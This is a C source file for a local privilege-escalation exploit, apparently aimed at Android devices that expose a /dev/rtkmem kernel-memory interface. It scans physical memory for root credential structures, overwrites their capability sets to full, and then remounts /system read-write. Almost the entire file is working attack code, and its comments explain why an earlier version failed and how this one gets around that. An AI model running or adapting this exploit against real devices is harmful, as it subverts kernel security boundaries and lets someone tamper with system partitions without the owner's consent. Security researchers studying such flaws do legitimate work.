/* rtcaps.c - raise capabilities of root creds via /dev/rtkmem, then test
 * whether /system can be remounted rw.
 *
 * rtroot.c only zeroed uid/gid and raised CAP WORDS THAT WERE ZERO. As a
 * result /proc/self/status shows CapEff=0 and CapBnd=0xc0 (adbd had already
 * dropped most of the bounding set), so mount(2) returns EPERM.
 *
 * This tool writes all four capability sets (inh/prm/eff/bset, 8 u32 words
 * at cred+0x28..0x47) to full for root creds, then immediately calls
 * mount(MS_REMOUNT) in the SAME process (no execve -> caps are not recomputed).
 *
 * --dry : scan and print only, write nothing, do not mount.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/mount.h>

#define SCAN_END 0x20000000UL
#define CHUNK    (1u << 20)
#define MAXHIT   128

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }
static int fd;

static int pointerish(uint32_t v) {
    return v >= 0xc0000000u && v <= 0xf0000000u;
}

static int valid_cred(const uint32_t *w) {
    if (w[0] < 1 || w[0] > 1000000) return 0;      /* usage */
    for (int q = 1; q <= 8; q++) if (w[q] != 0) return 0;  /* uid..fsgid = 0 */
    if (w[9] != 0) return 0;                        /* securebits */
    /* rtroot raised exactly the cap words that were ZERO to 0xffffffff.
     * A patched cred therefore has several 0xffffffff words - a fingerprint
     * unique enough to separate real creds from kernel look-alike arrays. */
    int full = 0;
    for (int k = 10; k < 18; k++) if (w[k] == 0xffffffffu) full++;
    if (full < 4) return 0;
    /* cred tail holds user_struct / group_info / rcu pointers - use it as a
     * structural sanity check so we never patch a look-alike blob. */
    if (!pointerish(w[24]) && !pointerish(w[25]) && !pointerish(w[26])) return 0;
    return 1;
}

int main(int argc, char **argv) {
    int dry = (argc > 1 && !strcmp(argv[1], "--dry"));
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    printf("[*] rtcaps pid=%d uid=%u dry=%d\n", (int)getpid(), getuid(), dry);
    fd = open("/dev/rtkmem", O_RDWR);
    if (fd < 0) { printf("open rtkmem: %s\n", strerror(errno)); return 2; }

    uint64_t found[MAXHIT];
    uint32_t caps[MAXHIT][8];
    int nfound = 0;
    for (uint64_t p = 0; p < SCAN_END && nfound < MAXHIT; p += CHUNK) {
        void *m = mmap(NULL, CHUNK, PROT_READ, MAP_SHARED, fd, (off_t)p);
        if (m == MAP_FAILED) continue;
        unsigned char *v = (unsigned char *)m;
        if (sigsetjmp(g_jmp, 1)) { munmap(m, CHUNK); continue; }
        for (size_t i = 0; i + 108 <= CHUNK && nfound < MAXHIT; i += 4) {
            uint32_t w[27];
            memcpy(w, v + i, sizeof(w));
            if (!valid_cred(w)) continue;
            found[nfound] = p + i;
            memcpy(caps[nfound], w + 10, 8 * sizeof(uint32_t));
            nfound++;
        }
        munmap(m, CHUNK);
    }
    printf("[*] root cred candidates: %d\n", nfound);
    for (int i = 0; i < nfound; i++) {
        printf("    [%2d] phys=0x%llx caps=%08x %08x %08x %08x | %08x %08x %08x %08x\n",
               i, (unsigned long long)found[i],
               caps[i][0], caps[i][1], caps[i][2], caps[i][3],
               caps[i][4], caps[i][5], caps[i][6], caps[i][7]);
    }
    fflush(stdout);
    if (dry) { close(fd); printf("[*] dry run, nothing written\n"); return 0; }
    if (nfound == 0) { printf("[!] none found\n"); close(fd); return 3; }

    int patched = 0;
    for (int i = 0; i < nfound; i++) {
        uint64_t phys = found[i];
        uint64_t page = phys & ~(uint64_t)0xfff;
        size_t off = (size_t)(phys - page);
        void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                       fd, (off_t)page);
        if (m == MAP_FAILED) continue;
        unsigned char *p = (unsigned char *)m + off;
        if (sigsetjmp(g_jmp, 1)) { munmap(m, 0x1000); continue; }
        uint32_t w[27];
        memcpy(w, p, sizeof(w));
        if (!valid_cred(w)) { munmap(m, 0x1000); continue; }
        volatile uint32_t *q = (volatile uint32_t *)p;
        for (int k = 10; k < 18; k++) q[k] = 0xFFFFFFFFu;
        __sync_synchronize();
        msync(m, 0x1000, MS_SYNC);
        munmap(m, 0x1000);
        patched++;
    }
    printf("[*] patched %d creds (all 4 cap sets -> full)\n", patched);
    fflush(stdout);
    close(fd);

    int r = mount(NULL, "/system", NULL, MS_REMOUNT, NULL);
    printf("[*] mount(MS_REMOUNT without RDONLY) -> %d %s\n", r,
           r == 0 ? "SUCCESS /system is now RW" : strerror(errno));
    fflush(stdout);
    if (r == 0) {
        int r2 = mount(NULL, "/system", NULL, MS_REMOUNT | MS_RDONLY, NULL);
        printf("[*] restored ro -> %d %s\n", r2, r2 == 0 ? "OK" : strerror(errno));
    }
    return r == 0 ? 0 : 1;
}
